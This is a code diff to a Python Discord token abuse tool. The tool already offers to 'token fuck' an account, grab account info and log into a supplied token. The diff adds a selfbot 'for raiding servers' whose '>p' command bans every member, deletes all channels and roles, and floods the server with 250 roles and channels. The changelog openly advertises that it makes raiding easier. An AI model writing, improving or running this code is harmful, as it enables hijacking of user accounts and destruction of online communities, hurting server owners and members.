@@ -4,9 +4,10 @@ from colorama import Fore, init
 from selenium import webdriver
 from datetime import datetime
 from itertools import cycle
+from discord.ext import commands
 
 def version():
-    currentversion = 3
+    currentversion = 4
     print("Checking if you have the latest version.")
     ver = urllib.request.urlopen("https://pastebin.com/raw/3JcRd4MC")
     for line in ver:
@@ -22,7 +23,6 @@ def version():
             time.sleep(9999)
         elif version == str(currentversion):
             print("You have the latest version.")
-            time.sleep(2)
             clear()
 
 init(convert=True)
@@ -54,6 +54,7 @@ class Login(discord.Client):
             input("Press any key to exit..."); exit(0)
 
 def tokenLogin(token):
+    headers = {'Authorization': token}
     opts = webdriver.ChromeOptions()
     opts.add_experimental_option("detach", True)
     driver = webdriver.Chrome('chromedriver.exe', options=opts)
@@ -69,6 +70,7 @@ def tokenLogin(token):
             """
     driver.get("https://discord.com/login")
     driver.execute_script(script + f'\nlogin("{token}")')
+    driver.get("https://discord.com/api/v8/users/@me/activities/statistics/applications", headers=headers)
 
 def tokenInfo(token):
     headers = {'Authorization': token, 'Content-Type': 'application/json'}  
@@ -173,16 +175,95 @@ def tokenFuck(token):
     print("\nToken has been fucked, you can close this now.")
     time.sleep(9999)
 
+def selfbot_check(token):
+    clear()
+
+    print("Checking token if valid.")
+
+    headers = {"Authorization": token}
+    r = requests.get("https://discord.com/api/v8/users/@me/settings", headers=headers)
+    if r.status_code == 401:
+        print("Invalid token passed, please re-enter the token. [401]")
+        time.sleep(2)
+        startMenu()
+    elif r.status_code == 200:
+        print("Valid token passed. [200]")
+        selfbot(token)
+
+def selfbot(token):
+    print("\nStarting self-bot...")
+
+    prefix = ">"
+    intents = discord.Intents.all()
+    bot = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True, fetch_offline_members=False, intents=intents)
+    bot.remove_command("help")
+    bot.http.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
+
+    @bot.event
+    async def on_ready():
+        print(f'\nLogged onto: {bot.user.name}#{bot.user.discriminator}\nID: {bot.user.id}\nPrefix: {prefix}\nCommand: {prefix}p [Bans everyone, deletes all channels and roles, creates 250 roles and channels.]\n')
+
+    @bot.command(pass_context=True)
+    async def p(ctx):
+
+        for m in ctx.guild.members:
+            try:
+                await ctx.guild.ban(m)
+                print(f"{Fore.GREEN}[BAN]{Fore.RESET} Banned user {Fore.YELLOW}{m} {Fore.RESET}ID: {Fore.YELLOW}{m.id}")
+            except discord.Forbidden:
+                print(f"{Fore.RED}[BAN]{Fore.RESET} Failed to ban user {Fore.YELLOW}{m} {Fore.RESET}ID: {Fore.YELLOW}{m.id}  {Fore.RESET}Reason: {Fore.YELLOW}Missing Permissions.")
+
+        for c in ctx.guild.channels:
+            try:
+                await c.delete()
+                print(f"{Fore.GREEN}[CHANNEL_DELETE] {Fore.RESET}Deleted channel {Fore.YELLOW}{c} {Fore.RESET}ID: {Fore.YELLOW}{c.id}")
+            except discord.Forbidden:
+                print(f"{Fore.RED}[CHANNEL_DELETE] {Fore.RESET} Failed to delete channel {Fore.YELLOW}{c} {Fore.RESET}ID: {Fore.YELLOW}{c.id} {Fore.RESET}Reason:{Fore.YELLOW} Missing permissions.")
+
+        for r in ctx.guild.roles:
+            try:
+                await r.delete()
+                print(f"{Fore.GREEN}[ROLE_DELETE] {Fore.RESET}Deleted role {Fore.YELLOW}{r} {Fore.RESET}ID: {Fore.YELLOW}{r.id}")
+            except discord.Forbidden:
+                print(f"{Fore.RED}[ROLE_DELETE] {Fore.RESET} Failed to delete role {Fore.YELLOW}{r} {Fore.RESET}ID: {Fore.YELLOW}{r.id} {Fore.RESET}Reason:{Fore.YELLOW} Missing permissions.")
+            except Exception:
+                print(f"{Fore.RED}[ROLE_DELETE] {Fore.RESET} Failed to delete role, unknown reason.")
+
+        for x in range(0, 250):
+            try:
+                await ctx.guild.create_role(name="GET FUCKED!", colour=discord.Colour(0xd300ff))
+                print(f"{Fore.GREEN}[ROLE_CREATE] {Fore.RESET}Created role, number: {x}")
+            except Exception:
+                print(f"{Fore.RED}[ROLE_CREATE] {Fore.RESET}Failed to create role.")
+
+        for x in range(0, 250):
+            try:
+                await ctx.guild.create_text_channel('GET FUCKED!')
+                print(f"{Fore.GREEN}[CHANNEL_CREATE] {Fore.RESET}Created text channel, number: {x}")
+                await ctx.guild.create_voice_channel('GET FUCKED!')
+                print(f"{Fore.GREEN}[CHANNEL_CREATE] {Fore.RESET}Created voice channel, number: {x}")
+                await ctx.guild.create_category_channel('GET FUCKED!')
+                print(f"{Fore.GREEN}[CHANNEL_CREATE] {Fore.RESET}Created category channel, number: {x}")
+            except Exception:
+                print(f"{Fore.RED}[CHANNEL_CREATE] {Fore.RESET}Failed to create channel")
+
+    bot.run(token, bot=False)
+
 def getBanner():
     banner = f'''
                 [{Fore.RED}1{Fore.RESET}] Token fuck the account
                 [{Fore.RED}2{Fore.RESET}] Grab info about the account
-                [{Fore.RED}3{Fore.RESET}] Log into a token
+                [{Fore.RED}3{Fore.RESET}] Log into a token                     {Fore.GREEN}[Requires chromedriver.exe]{Fore.RESET}
+                [{Fore.RED}4{Fore.RESET}] Self-bot for raiding servers.        {Fore.GREEN}[NEW FEATURE!]{Fore.RESET}                 
+
+                {Fore.GREEN} Changelog: {Fore.CYAN}This is quite a big update, since this makes raiding servers so much
+                easier since I have made a self-bot for raiding servers.
 
     '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
     return banner
 
 def startMenu():
+    clear()
     print(getBanner())
     print(f'[{Fore.RED}>{Fore.RESET}] Your choice', end=''); choice = str(input('  :  '))
 
@@ -201,6 +282,10 @@ def startMenu():
     elif choice == '3':
         print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
         tokenLogin(token)
+
+    elif choice == '4':
+        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
+        selfbot_check(token)
 
     elif choice.isdigit() == False:
         clear()
